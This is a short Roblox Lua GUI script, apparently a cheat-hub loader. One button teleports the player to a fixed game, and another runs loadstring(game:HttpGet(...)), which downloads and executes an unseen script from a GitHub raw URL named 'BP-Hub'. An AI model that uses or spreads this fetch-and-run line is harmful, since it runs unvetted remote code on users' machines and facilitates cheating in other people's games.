-- Scripts:

local function QSJNOE_fake_script() -- ABG.ABG 
	local script = Instance.new('LocalScript', ABG)

	ABG.MouseButton1Down:connect(function()
		TeleportABG.Visible = not TeleportABG.Visible
		ExecuteABG.Visible = not ExecuteABG.Visible
	end)
	TeleportABG.MouseButton1Down:connect(function()
		game:GetService("TeleportService"):Teleport(10373626245, LocalPlayer)
	end)
	ExecuteABG.MouseButton1Down:connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/bpitcher2013/BP-Hub/main/Another%20Bizarre%20Game", true))()
	end)
end
coroutine.wrap(QSJNOE_fake_script)()
